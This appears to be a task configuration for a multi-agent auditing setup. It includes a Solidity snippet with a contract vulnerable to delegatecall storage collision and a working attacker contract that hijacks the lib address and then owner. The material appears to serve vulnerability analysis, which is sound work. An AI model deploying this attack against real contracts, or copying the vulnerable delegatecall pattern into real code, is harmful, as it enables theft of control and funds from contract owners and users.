@@ -1,0 +1,30 @@
+Task:
+###pragma solidity ^0.4.24;contract Lib {uint public num;function performOperation(uint _num) public {num = _num;}}contract Vulnerable {address public lib;address public owner;uint public num;constructor(address _lib) {lib = _lib;owner = msg.sender;}function performOperation(uint _num) public {lib.delegatecall(abi.encodeWithSignature("performOperation(uint256)", _num));}}contract AttackVulnerable {address public lib;address public owner;uint public num;Vulnerable public vulnerable;constructor(Vulnerable _vulnerable) {vulnerable = Vulnerable(_vulnerable);}function attack() public {vulnerable.performOperation(uint(address(this)));vulnerable.performOperation(9);}function performOperation(uint _num) public {owner = msg.sender;}}###
+
+Config:
+ChatEnvConfig.clear_structure: True
+ChatEnvConfig.git_management: False
+ChatEnvConfig.gui_design: True
+
+
+Roster:
+Chief Executive Officer, Counselor, Security Analyst, Solidity Programming Expert, Security Testing Engineer
+
+Modality:
+
+
+Ideas:
+ NO Lack of Gas Limit Considerations.
+
+Language:
+
+
+Code_Version:
+0.0
+
+Proposed_images:
+0
+
+Incorporated_images:
+0
+
